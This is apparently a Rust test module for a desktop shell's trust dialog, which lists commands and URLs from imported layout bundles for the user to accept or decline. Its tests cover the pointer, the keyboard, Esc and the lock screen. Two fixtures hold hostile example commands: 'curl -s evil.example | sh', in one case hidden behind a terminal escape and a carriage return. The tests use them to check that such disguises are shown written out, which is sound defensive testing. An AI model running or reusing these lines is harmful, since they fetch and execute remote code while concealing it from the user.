//! The trust dialog in the overlay window, as the transient layer builds it: it lists exactly what waits with its whole text, an answer given with the pointer or the keyboard alone is recorded and takes its row away, Esc and the lock close it with everything still waiting, and the notice follows what waits.

#[cfg(test)]
mod tests {
    use std::cell::RefCell;
    use std::collections::BTreeMap;
    use std::path::PathBuf;
    use std::rc::Rc;

    use telar::{
        AvailableSpace, ComponentList, Container, DrawCommand, Event, Key, LayoutItem, LayoutStyle,
        ModifiersState, NamedKey, PointerButton, PointerSource, Rect, compute_layout,
    };

    use layout::bundle::{Bundle, Manifest};
    use layout::{Item, LayerKind, Layout, LayoutId, LayoutStore, Verdict};
    use ui::descriptor::{Category, ChipDef, Input, ModuleDescriptor, Representations};

    use crate::bundles;
    use crate::catalogue::Descriptors;
    use crate::layer_window::{Demands, Reserved, Screen, WindowKey};
    use crate::transient::{self, Frame};
    use crate::trust_dialog::{self, ID, WIDTH};

    const SIZE: (f32, f32) = (1920.0, 1080.0);

    /// Long enough to be wider than the dialog on one line, so showing it whole means wrapping it.
    const FORECAST: &str = "curl --silent --max-time 10 --header 'Accept: application/json' 'https://wttr.in/Reykjav%C3%ADk?format=j1&lang=en&units=metric'";

    fn unbuilt(_: &ui::host::Host) -> ui::descriptor::Built {
        Err(telar::LayoutError::Engine("never built".to_string()))
    }

    const TABLE: &[ModuleDescriptor] = &[ModuleDescriptor {
        id: "clock",
        name: "clock",
        icon: "clock",
        category: Category::Info,
        options: &[],
        representations: Representations {
            chip: Some(ChipDef::new(unbuilt, Input::ReadOnly)),
            ..Representations::NONE
        },
        actions: &[],
        sources: &[],
    }];

    fn scratch(name: &str) -> PathBuf {
        let dir = util::paths::isolated_root()
            .expect("a test resolves under its scratch root")
            .join(format!("trust-dialog-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a scratch directory");
        dir
    }

    /// An empty layouts directory of the test's own, installed as the store this thread's shell draws from.
    fn shell(test: &str) -> Rc<RefCell<LayoutStore>> {
        let dir = scratch(test).join("layouts");
        std::fs::create_dir_all(&dir).unwrap();
        let (mut store, report) = LayoutStore::load(&dir);
        assert!(report.is_clean(), "{}", report.render());
        store.set_trust(bundles::trust_of(
            &services::state::get(),
            layout::Trust::default().rule(),
        ));
        let store = Rc::new(RefCell::new(store));
        crate::layouts::install(Rc::clone(&store), Rc::new(|| {}));
        store
    }

    /// A layout that reads the weather with a long command that says the lock screen may show it, fetches an address, and runs a line when its bar is pressed.
    fn sharing(name: &str) -> Layout {
        let mut layout: Layout = toml::from_str(&format!(
            r#"
[sources.forecast]
kind = "poll"
cmd = "{}"
every = "5m"
lock_safe = true

[sources.feed]
kind = "http"
url = "https://example.org/{name}.json"
every = "10m"

[[outputs]]
match = "*"

[[outputs.layers.top.areas]]
id = "bar"
kind = "bar"
edge = "top"
thickness = 30.0

[outputs.layers.top.areas.actions]
press = ["shell run notify-send {name}"]

[[outputs.layers.top.areas.groups]]
id = "end"
place = "zone"
zone = "end"

[[outputs.layers.top.areas.groups.children]]
id = "clock"
module = "clock"
"#,
            FORECAST,
        ))
        .expect("the layout parses");
        layout.id = LayoutId::new(name);
        layout
    }

    /// Imports the bundle `name`, whose one layout is [`sharing`].
    fn import(name: &str) {
        import_layout(name, sharing(name));
    }

    /// Imports the bundle `name`, whose one layout is `layout`.
    fn import_layout(name: &str, layout: Layout) {
        let dir = scratch(&format!("{name}-bundle"));
        let bundle = Bundle {
            manifest: Manifest {
                name: name.to_string(),
                description: None,
                author: None,
            },
            layouts: BTreeMap::from([(layout.id.clone(), layout)]),
            komponents: BTreeMap::new(),
            assets: BTreeMap::new(),
            texts: BTreeMap::new(),
        };
        let out = dir.join("bundle");
        bundle.write(&out).expect("the bundle writes");
        let checking = bundles::Checking::new(
            &Descriptors::new(TABLE, |_| true),
            &config::Config::default(),
        );
        bundles::load(&out, &checking)
            .and_then(bundles::install)
            .unwrap_or_else(|report| panic!("{}", report.render()));
    }

    fn items(bundle: &str) -> Vec<(Item, Verdict)> {
        bundles::bundles()
            .expect("a store")
            .into_iter()
            .find(|held| held.name == bundle)
            .expect("the bundle is remembered")
            .items
    }

    fn verdict(bundle: &str, key: &str) -> Verdict {
        items(bundle)
            .into_iter()
            .find(|(item, _)| item.key == key)
            .map(|(_, verdict)| verdict)
            .unwrap_or_else(|| panic!("{key} is an item"))
    }

    fn declared(store: &Rc<RefCell<LayoutStore>>, id: &str) -> Vec<String> {
        let store = store.borrow();
        let layout = store.get(&LayoutId::new(id)).expect("the store holds it");
        let (sources, _) = automation::sources::of_layout(
            layout,
            store.all(),
            &config::AutomationConfig::default(),
        );
        sources.iter().map(|(name, _)| name.clone()).collect()
    }

    /// An owner for what a test builds, and the overlay window the dialog opens in, built as the window builds its transient layer.
    /// Whether the text `drawn` reads as `wanted`: as it is, or as a command row draws it, inside a left-to-right isolate.
    fn reads(drawn: &str, wanted: &str) -> bool {
        drawn == wanted || drawn == util::text::isolated(wanted)
    }

    struct Overlay {
        tree: Option<ComponentList>,
        root: telar::NodeId,
        owner: telar::OwnerId,
    }

    impl Overlay {
        fn new() -> Self {
            transient::close_all();
            ui::descriptor::install(TABLE);
            telar::reset_layout_runtime();
            telar::set_locale("en");
            telar::set_theme(config::Config::default().resolve_theme());
            let owner = telar::detached(|| telar::owner_scope().id());
            let (tree, root) = telar::with_owner(Some(owner), || {
                let screen = telar::signal(Screen {
                    size: SIZE,
                    reserved: Reserved::default(),
                });
                let frame = Frame {
                    screen: screen.read_only(),
                    demands: Rc::new(Demands::new(platform_wayland::Layer::Overlay)),
                };
                let layer = transient::layer(
                    WindowKey {
                        output: None,
                        layer: LayerKind::Overlay,
                    },
                    frame,
                )
                .expect("the transient layer builds");
                let page = Container::new(
                    LayoutStyle::new().width(SIZE.0).height(SIZE.1),
                    vec![layer as Box<dyn LayoutItem>],
                )
                .expect("a page");
                let root = page.layout_node();
                (ComponentList::new(page), root)
            });
            let overlay = Self {
                tree: Some(tree),
                root,
                owner,
            };
            overlay.lay_out();
            overlay
        }

        fn tree(&self) -> &ComponentList {
            self.tree.as_ref().expect("the window is up")
        }

        fn lay_out(&self) {
            for _ in 0..3 {
                telar::relayout_if_dirty();
            }
            compute_layout(
                self.root,
                AvailableSpace::Definite(SIZE.0),
                AvailableSpace::Definite(SIZE.1),
            )
            .expect("the window lays out");
        }

        /// As the runner does: the keyboard's state first, then the overlays and the dismiss stack, then the tree.
        fn route(&mut self, event: &Event) {
            telar::observe_keyboard(event);
            if !telar::dispatch_overlays(event) {
                self.tree
                    .as_mut()
                    .expect("the window is up")
                    .on_event(event);
            }
            self.lay_out();
        }

        fn key(&mut self, named: NamedKey) {
            self.route(&Event::KeyPressed {
                key: Key::Named(named),
                modifiers: ModifiersState::default(),
            });
        }

        fn click(&mut self, (x, y): (f32, f32)) {
            let (x, y) = (f64::from(x), f64::from(y));
            self.route(&Event::PointerMoved {
                x,
                y,
                source: PointerSource::Mouse,
            });
            for pressed in [true, false] {
                let event = match pressed {
                    true => Event::PointerPressed {
                        x,
                        y,
                        button: PointerButton::Primary,
                        source: PointerSource::Mouse,
                    },
                    false => Event::PointerReleased {
                        x,
                        y,
                        button: PointerButton::Primary,
                        source: PointerSource::Mouse,
                    },
                };
                self.route(&event);
            }
        }

        /// Every text the window draws, where it is on screen.
        fn texts(&self) -> Vec<(String, Rect)> {
            let mut found = Vec::new();
            telar::for_each_with_matrix(&self.tree().commands(), |command, [a, b, c, d, e, f]| {
                if let DrawCommand::Text { text, rect, .. } = command {
                    found.push((
                        text.to_string(),
                        Rect::new(
                            a * rect.x + c * rect.y + e,
                            b * rect.x + d * rect.y + f,
                            rect.width,
                            rect.height,
                        ),
                    ));
                }
            });
            found
        }

        fn shows(&self, wanted: &str) -> bool {
            self.texts().iter().any(|(text, _)| reads(text, wanted))
        }

        /// A press on the first `label` drawn below the text `text`.
        fn press_below(&mut self, text: &str, label: &str) {
            let texts = self.texts();
            let above = texts
                .iter()
                .find(|(drawn, _)| reads(drawn, text))
                .map(|(_, rect)| *rect)
                .unwrap_or_else(|| panic!("{text:?} is drawn"));
            let rect = texts
                .iter()
                .filter(|(drawn, rect)| drawn == label && rect.y > above.y)
                .map(|(_, rect)| *rect)
                .min_by(|a, b| a.y.total_cmp(&b.y))
                .unwrap_or_else(|| panic!("a {label:?} below {text:?}"));
            self.click((rect.x + rect.width / 2.0, rect.y + rect.height / 2.0));
        }
    }

    impl Drop for Overlay {
        fn drop(&mut self) {
            transient::close_all();
            self.tree.take();
            telar::dispose_owner(self.owner);
        }
    }

    const NOTIFY: &str = "shell run notify-send";

    /// It lists what waits and nothing else, each item's kind, where it is written and its lock promise, and the text exactly as written — the long command too, wrapped inside the dialog rather than cut.
    #[test]
    fn the_dialog_lists_exactly_what_waits_with_its_whole_text() {
        let _store = shell("lists");
        import("lists");
        let feed = items("lists")
            .into_iter()
            .find(|(item, _)| item.key == "sources.feed.url")
            .map(|(item, _)| item)
            .expect("the address");
        bundles::accept("lists", &[feed]).expect("it accepts");
        let overlay = Overlay::new();

        assert_eq!(trust_dialog::open_unless(false), Ok(2));
        overlay.lay_out();

        let texts = overlay.texts();
        let forecast = texts
            .iter()
            .find(|(text, _)| reads(text, FORECAST))
            .map(|(_, rect)| *rect)
            .unwrap_or_else(|| panic!("the whole command is drawn: {texts:?}"));
        assert!(
            forecast.width <= WIDTH && forecast.height > 30.0,
            "it wraps inside the dialog: {forecast:?}"
        );
        assert!(overlay.shows(&format!("{NOTIFY} lists")));
        assert!(
            !overlay.shows("https://example.org/lists.json"),
            "what was answered is not asked again"
        );
        assert!(overlay.shows("Command, run on an interval"));
        assert!(overlay.shows("Action line, run when its gesture is made"));
        assert!(overlay.shows("Written in layouts/lists.toml, at sources.forecast.cmd"));
        assert!(overlay.shows("lists: 2 items wait"));
        assert_eq!(
            texts
                .iter()
                .filter(|(text, _)| text.starts_with("Says the lock screen may show"))
                .count(),
            1,
            "the command that says it is lock-safe says so, and the line does not"
        );
        assert_eq!(texts.iter().filter(|(text, _)| text == "Accept").count(), 2);
    }

    /// Accept with the pointer: the source is declared, so its producer can start, and its row goes; the rest still waits.
    #[test]
    fn accepting_with_the_pointer_runs_the_source_and_takes_its_row_away() {
        let store = shell("accepts");
        import("accepts");
        let mut overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        assert!(declared(&store, "accepts").is_empty());

        overlay.press_below(FORECAST, "Accept");

        assert_eq!(
            verdict("accepts", "sources.forecast.cmd"),
            Verdict::Accepted
        );
        assert_eq!(declared(&store, "accepts"), ["forecast"]);
        assert!(!overlay.shows(FORECAST), "its row is gone");
        assert!(overlay.shows(&format!("{NOTIFY} accepts")));
        assert!(overlay.shows("accepts: 2 items wait"));
        assert_eq!(verdict("accepts", "sources.feed.url"), Verdict::Pending);
        assert!(trust_dialog::is_open());
    }

    /// Decline with the pointer: the line stays off and the layout says it was declined.
    #[test]
    fn declining_with_the_pointer_is_reported_as_declined() {
        let store = shell("declines");
        import("declines");
        let mut overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        let line = format!("{NOTIFY} declines");

        overlay.press_below(&line, "Decline");

        assert_eq!(
            verdict("declines", "outputs.*.layers.top.areas.bar.actions.press"),
            Verdict::Declined
        );
        assert!(!overlay.shows(&line));
        let held = {
            let store = store.borrow();
            layout::held(store.get(&LayoutId::new("declines")).unwrap(), store.all())
        };
        assert!(
            held.findings()
                .any(|finding| finding.message.key() == Some("finding.trust_declined")),
            "{}",
            held.render()
        );
    }

    /// Esc closes it and answers nothing: every item still waits and nothing it brought runs.
    #[test]
    fn esc_closes_the_dialog_with_everything_still_waiting() {
        let store = shell("escapes");
        import("escapes");
        let mut overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        assert!(overlay.shows(FORECAST));

        overlay.key(NamedKey::Escape);

        assert!(!trust_dialog::is_open());
        assert!(
            items("escapes")
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending)
        );
        assert!(declared(&store, "escapes").is_empty());
        assert!(bundles::pending().peek());
    }

    /// WCAG 2.5.7: the keyboard alone reaches an item's Accept — Tab into the dialog, the arrows across its controls, Enter — and is then handed to the row that took its place.
    #[test]
    fn the_keyboard_alone_accepts_an_item() {
        let _store = shell("keys");
        import("keys");
        let mut overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        let listed = trust_dialog::waiting().expect("a store")[0].items.clone();
        let (first, second) = (&listed[0], &listed[1]);
        assert_eq!(
            telar::focus::current(),
            None,
            "nothing is answered by a stray Enter"
        );
        overlay.key(NamedKey::Enter);
        assert!(
            items("keys")
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending)
        );

        overlay.key(NamedKey::Tab);
        for _ in 0..3 {
            overlay.key(NamedKey::ArrowDown);
        }
        overlay.key(NamedKey::Enter);

        assert_eq!(verdict("keys", &first.key), Verdict::Accepted);
        assert!(!overlay.shows(&first.text), "its row is gone");
        assert_eq!(verdict("keys", &second.key), Verdict::Pending);
        assert!(
            telar::focus::current().is_some(),
            "the keyboard is handed on rather than dropped"
        );

        overlay.key(NamedKey::Enter);
        assert_eq!(
            verdict("keys", &second.key),
            Verdict::Declined,
            "it landed on the next item's Decline"
        );
    }

    /// TA-8: nothing opens it while the session is locked, and the lock closes it.
    #[test]
    fn nothing_opens_the_dialog_while_the_session_is_locked() {
        let _store = shell("locked");
        import("locked");
        let _overlay = Overlay::new();

        let refused = trust_dialog::open_unless(true).expect_err("refused while locked");
        assert_eq!(refused.key(), Some("finding.trust_dialog_locked"));
        assert!(!transient::is_open(ID));

        let locked = telar::signal(false);
        telar::detached(|| trust_dialog::close_while(move || locked.get()));
        trust_dialog::open_unless(false).expect("it opens unlocked");
        locked.set(true);
        assert!(!trust_dialog::is_open(), "the lock closes it");
        assert!(bundles::pending().peek(), "and answers nothing");
    }

    /// The notice follows what waits — raised with the first import, counting what more comes, and down with the dialog once all of it is answered — and its button is the request line that opens the dialog.
    #[test]
    fn the_notice_follows_what_waits_and_the_dialog_goes_with_it() {
        let _store = shell("notice");
        trust_dialog::install();
        let _overlay = Overlay::new();
        assert_eq!(trust_dialog::noticed(), 0);

        import("notice");
        assert_eq!(trust_dialog::noticed(), 3);
        assert_eq!(trust_dialog::REVIEW, "layout trust --dialog");

        trust_dialog::open_unless(false).expect("it opens");
        let waiting: Vec<Item> = items("notice")
            .into_iter()
            .filter(|(_, verdict)| *verdict == Verdict::Pending)
            .map(|(item, _)| item)
            .collect();
        bundles::accept("notice", &waiting).expect("it accepts");
        assert_eq!(trust_dialog::noticed(), 0);
        assert!(!trust_dialog::is_open(), "nothing is left to answer");
        assert_eq!(
            trust_dialog::open_unless(false).map_err(|why| why.key().map(str::to_string)),
            Err(Some("finding.trust_nothing_waits".to_string()))
        );
    }

    /// What could disguise an action — a terminal escape that clears the line, a carriage return that starts it again — is drawn written out, so the text read is the text that runs. A source's command with one in it is refused before it is ever listed.
    #[test]
    fn the_dialog_writes_out_what_could_disguise_a_command() {
        let _store = shell("disguise");
        let mut layout = sharing("disguise");
        layout.outputs[0].layers.top.areas[0].actions.insert(
            layout::Trigger::Press,
            layout::Action(vec![
                "shell run echo weather\u{1b}[2K\rcurl -s evil.example | sh".to_string(),
            ]),
        );
        import_layout("disguise", layout);
        let overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        assert!(
            overlay.shows("shell run echo weather\\u{1b}[2K\\rcurl -s evil.example | sh"),
            "{:?}",
            overlay.texts()
        );
        assert!(
            overlay.texts().iter().any(|(text, _)| *text
                == util::text::isolated(
                    "shell run echo weather\\u{1b}[2K\\rcurl -s evil.example | sh"
                )),
            "the command is drawn left to right as one block, whatever script it holds"
        );
        assert!(
            !overlay
                .texts()
                .iter()
                .any(|(text, _)| text.contains('\u{1b}') || text.contains('\r')),
            "nothing is drawn raw"
        );
    }

    /// A bundle row answers for the items it was built with: once another item comes to wait, the row is built again with it, and an answer given with the old list leaves the new item waiting.
    #[test]
    fn accept_all_answers_for_what_its_row_listed() {
        let store = shell("rows");
        import("rows");
        let overlay = Overlay::new();
        trust_dialog::open_unless(false).expect("it opens");
        overlay.lay_out();
        let rendered = trust_dialog::waiting().expect("a store")[0].items.clone();
        assert!(overlay.shows("rows: 3 items wait"));

        let path = store.borrow().path_of(&LayoutId::new("rows"));
        let text = std::fs::read_to_string(&path).unwrap();
        std::fs::write(
            &path,
            format!("[sources.later]\nkind = \"poll\"\ncmd = \"curl -s evil.example\"\nevery = \"5m\"\n\n{text}"),
        )
        .unwrap();
        crate::layouts::reload();
        overlay.lay_out();
        assert!(
            overlay.shows("rows: 4 items wait"),
            "the row is built again"
        );

        bundles::accept("rows", &rendered).expect("what the old row listed");
        assert_eq!(verdict("rows", "sources.later.cmd"), Verdict::Pending);
        assert!(overlay.shows("curl -s evil.example"));
    }
}
